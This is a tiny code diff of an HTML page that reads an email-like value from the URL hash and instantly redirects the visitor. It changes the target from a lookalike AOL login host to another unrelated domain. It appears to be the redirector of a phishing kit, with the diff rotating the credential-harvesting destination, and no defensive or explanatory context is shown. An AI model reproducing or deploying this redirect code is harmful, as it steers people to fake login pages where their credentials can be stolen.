@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://login-aol2go.ngavanbeeknl.com/";
+			window.location.href = "https://customer.radioexprets.co.uk/?";
 		}, 0);
 	</script>
 </html>
